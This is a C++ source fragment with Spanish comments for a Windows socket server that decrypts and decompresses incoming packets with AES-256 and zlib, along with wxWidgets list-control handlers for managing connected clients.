int Servidor::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* error_code) {
    
    // 1 non block
    // 0 block
    
    if (!pBuffer) {
        std::cout << "Buffer no reservado para recibir paquete\n";
        return 0;
    }

    std::unique_ptr<char[]> cTmpBuff = std::make_unique<char[]>(pLen);
    
    int iRecibido = 0;
    unsigned long int iBlock = 0;
    
    //Hacer el socket block
    if (isBlock) {
        //Hacer el socket block
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }
    }

    //Recibir el buffer
    iRecibido = recv(pSocket, cTmpBuff.get(), pLen, pFlags);
    if (error_code != nullptr) {
        *error_code = WSAGetLastError();
    }

    if (WSAGetLastError() == WSAECONNRESET || iRecibido < 0) {
        return WSAECONNRESET;
    }else if (iRecibido == 0) {
        return iRecibido;
    }

    //Restaurar el socket
    if (isBlock) {
        iBlock = 1;
        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
            this->m_txtLog->LogThis("Error configurando el socket NON_BLOCK", LogType::LogError);
        }
    }
        
    //Decrypt
    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cTmpBuff.get()), iRecibido);
    //Quitar 2 bytes por la cabecera
    iRecibido = bOut.size() - 2;
    if (iRecibido == 0) {
        error();
        return -1;
    }
        
    //Comprobar si tiene la cabecera
    if (iRecibido > 2) { //?
        if (bOut[0] == COMP_HEADER_BYTE_1 && bOut[1] == COMP_HEADER_BYTE_2) {
            std::shared_ptr<unsigned char[]> uncompBuffer(new unsigned char[pLen]);
            if (uncompBuffer) {
                unsigned long out_len = pLen;
                int iRet = uncompress(uncompBuffer.get(), &out_len, bOut.data() + 2, iRecibido);
                if (iRet == Z_OK) {
                    //Si el buffer final es menor al tamaño del buffer final proceder
                    if (out_len < pLen) {
                        std::memcpy(pBuffer, uncompBuffer.get(), out_len);
                        iRecibido = out_len;
                    }else {
                        std::cout << "El buffer descomprimido es mayor al buffer reservado (parametro)\n";
                        iRecibido = 0;
                    }
                }else if (iRet == Z_MEM_ERROR) {
                    std::cout << "No hay memoria suficiente\n";
                    iRecibido = 0;
                }else if (iRet == Z_BUF_ERROR) {
                    std::cout << "El output no tiene memoria suficiente\n";
                    iRecibido = 0;
                }else {
                    std::cout << "A jaber que pajo\n";
                    iRecibido = 0;
                }
            }else {
                std::cout << "No se pudo reservar memoria para descomprimir el paquete\n";
                iRecibido = 0;
            }
        }else {
            //No tiene la cabecera de compreso, copiar buffer desencriptado
            std::memcpy(pBuffer, bOut.data()+2, iRecibido);
        }
    }

    return iRecibido;
}

//AES256
ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen) {
    ByteArray bOutput;
    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
    if (enc_len <= 0) {
        std::cout<<"Error encriptando "<<pInput<<"\n";
    }
    return bOutput;
}

ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen) {
    ByteArray bOutput;
    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
    if (dec_len <= 0) {
        std::cout << "Error desencriptando " << pInput << "\n";
    }
    return bOutput;
}

//control list events
void MyListCtrl::ShowContextMenu(const wxPoint& pos, long item) {

    wxMenu menu;
    menu.Append(EnumIDS::ID_Interactuar, "Administrar");
    menu.AppendSeparator();
    menu.Append(EnumIDS::ID_Refrescar, "Refrescar");
    
    PopupMenu(&menu, pos.x, pos.y);
}

void MyListCtrl::OnContextMenu(wxContextMenuEvent& event)
{
    if (GetEditControl() == NULL)
    {
        wxPoint point = event.GetPosition();

        // If from keyboard
        if ((point.x == -1) && (point.y == -1))
        {
            wxSize size = GetSize();
            point.x = size.x / 2;
            point.y = size.y / 2;
        }
        else
        {
            point = ScreenToClient(point);
        }

        int flags;
        long iItem = HitTest(point, flags);

        if (iItem == -1) {
            return;
        }

        wxString st1 = this->GetItemText(iItem, 0);
        this->strTmp = st1;
        this->strTmp.append(1, '/');
        this->strTmp += this->GetItemText(iItem, 1);
        this->strTmp.append(1, '/');
        this->strTmp += this->GetItemText(iItem, 2);

        ShowContextMenu(point, iItem);
    }
    else
    {
        event.Skip();
    }
}

void MyListCtrl::OnInteractuar(wxCommandEvent& event) {
    std::vector<std::string> vcOut = strSplit(strTmp.ToStdString(), '/', 2);

    std::unique_lock<std::mutex> lock(vector_mutex);
    for (std::vector<Cliente_Handler*>::iterator it = p_Servidor->vc_Clientes.begin(); it != p_Servidor->vc_Clientes.end(); it++) {
        if ((*it)->p_Cliente._id == vcOut[0]) {
            lock.unlock();

            (*it)->CrearFrame(this->strTmp.ToStdString(), vcOut[0]);

            lock.lock();
            break;
        }
    }
}

void MyListCtrl::OnActivated(wxListEvent& event) {
    if (this->GetItemCount() > 0) {
        wxString strID = this->GetItemText(event.GetIndex(), 0);
        std::unique_lock<std::mutex> lock(vector_mutex);
        for (auto& cliente : p_Servidor->vc_Clientes) {
            if (cliente->p_Cliente._id == strID.ToStdString()) {
                lock.unlock();
                
                wxString st1 = this->GetItemText(event.GetIndex(), 0);
                st1.append(1, '/');
                st1 += this->GetItemText(event.GetIndex(), 1);
                st1.append(1, '/');
                st1 += this->GetItemText(event.GetIndex(), 2);
                cliente->CrearFrame(st1.ToStdString(), strID.ToStdString());
                break;
            }
        }
    }
}

void MyListCtrl::OnRefrescar(wxCommandEvent& event) {
    this->DeleteAllItems();
    std::unique_lock<std::mutex> lock(vector_mutex);

    for (auto& cliente : p_Servidor->vc_Clientes) {
        p_Servidor->m_InsertarCliente(cliente->p_Cliente);
    }
}